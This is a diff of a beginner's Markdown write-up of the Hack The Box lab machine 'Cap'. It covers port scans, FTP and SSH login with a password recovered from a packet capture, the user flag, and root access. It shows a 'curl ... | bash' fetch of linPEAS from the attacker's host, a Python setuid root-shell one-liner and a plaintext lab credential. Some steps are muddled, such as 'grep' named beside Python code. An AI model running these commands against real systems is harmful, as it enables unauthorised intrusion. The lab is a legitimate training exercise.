@@ -13,24 +13,24 @@
 
 First, I scanned the network looking for open ports 
 nmap 10.129.178.103
-
+```
 PORT   STATE SERVICE
 
 21/tcp open  ftp
 22/tcp open  ssh
 80/tcp open  http
-
+```
 Then I tried to see the services:
 
 nmap -p 21,22,80 -sV 10.129.178.103
 
-
+```
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Gunicorn
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
+```
 ### Enumeration
 
 ## 2. Initial Access
@@ -39,19 +39,19 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ftp 10.129.178.103 using anonymous as the user 
 However I could get in by ftp it appeared this:
-
+```
 Name (10.129.178.103:vartriz): anonymous
 331 Please specify the password.
 Password: 
 530 Login incorrect.
 ftp: Login failed.
 ftp> 
-
+```
 It seems that the login by Anonymous is locked and the FTP is active
 
 ### SSH (22)
 nmap -p 22 --script ssh2-enum-algos 10.129.178.103
-
+```
 PORT   STATE SERVICE
 22/tcp open  ssh
 | ssh2-enum-algos: 
@@ -93,7 +93,7 @@ PORT   STATE SERVICE
 |       none
 |_      zlib@openssh.com
 
-
+```
 As you can see we have info about the SSH;
 ssh2-enum-alogos didnt find any vulnerability, all algorithms are secure such as passwords ( rsa-sha2 ).
 In conclusion, guess I cant access by SSH
@@ -101,7 +101,7 @@ In conclusion, guess I cant access by SSH
 ### HTTP (80)
 
 I needed to see what's going on this page. It looks like a Security dashboard.
-
+```
 curl -I http://10.129.178.103
 
 HTTP/1.1 200 OK
@@ -110,7 +110,7 @@ Date: Thu, 22 Oct 2026 00:37:32 GMT
 Connection: keep-alive
 Content-Type: text/html; charset=utf-8
 Content-Length: 19386
-
+```
 Gunicorn is a server WSGI ( Python ) Does it mean there must be something in the backend using python.
 Maybe something like Flask.
 
@@ -144,7 +144,7 @@ The first file that I opened it was data 0 and i saw how wireshark was detecting
 YOU KNOW WHAT MEANS THAT?
 Yea, we can access by ftp because we have the user ( nathan ) and the password (Request arg: Buck3tH4TF0RM3!)	
 I tried that and I joined 
-
+```
 Name (10.129.178.103:vartriz): nathan
 331 Please specify the password.
 Password: 
@@ -157,11 +157,11 @@ ftp> ls
 -r--------    1 1001     1001           33 Oct 22 00:10 user.txt
 226 Directory send OK.
 ftp> get user.txt
-
+```
 Then I read the flag : 3587756c0076d6d8bb95496ff34e1893
 
 But it wasnt the greatest thing today, it was that it works with SSH too.
-
+```
 nathan@10.129.178.103's password: 
 Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
 
@@ -197,13 +197,13 @@ To check for new updates run: sudo apt update
 
 Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
 nathan@cap:~$ 
-
+```
 The last task is : Being root
 
 I didnt know how to do that ... the offical document shows this tool called linPEAS.
 let's use it.
 
-
+```
 nathan@cap:~$ curl http://10.129.178.103/linpeas.sh | bash
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -211,7 +211,7 @@ nathan@cap:~$ curl http://10.129.178.103/linpeas.sh | bash
 bash: line 1: syntax error near unexpected token `newline'
 bash: line 1: `<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">'
 nathan@cap:~$ 
-
+```
 I realized it didnt work then i had to see the reason.
 
 Creating a server using python3 -m http.server 80 to listening to the server.
@@ -219,7 +219,7 @@ I gotta connect my server to the web' server
 
 curl http://10.10.14.208/linpeas.sh | bash showing what's wrong with the victim' system.
 It appeared a vulnerability related with python then we gotta take avarage of that.
-
+```
 _=/usr/bin/bash
 _=/usr/bin/cat
 _=/usr/bin/dd
@@ -228,9 +228,12 @@ _=/usr/bin/sed
 _=/usr/bin/sort
 _=/usr/bin/tr
 _=/usr/bin/xxd
+```
 
 and finally, using /usr/bin/grep
+
 we can do this according to the Walkthrough of Cap
+```
 >>> import os
 >>> os.setuid(0)
 >>> os.system("/bin/bash")
@@ -239,11 +242,14 @@ uid=0(root) gid=1001(nathan) groups=1001(nathan)
 root@cap:~# 
 root@cap:~# cat user.txt 
 3587756c0076d6d8bb95496ff34e1893
-
+```
 
 ##4. Evidence
+
 ### Images:
 
+
+ 
 ### Versions:
 
 FTP vsftpd 3.0.3
@@ -255,6 +261,9 @@ HTTP Gunicorn
 - What concepts did I learn?
 At first, I learn how to access by FTP using the anonymous trick.
 At second, How to root when you can login via SSH
+
 ## References
 
-
+- **HTB Machine:** [Hack The Box - Cap](https://app.hackthebox.com/machines/Cap)
+- **Privilege Escalation Tool:** [LinPEAS (PEASS-ng)](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+- **Network Packet Analysis:** [Wireshark](https://www.wireshark.org/)
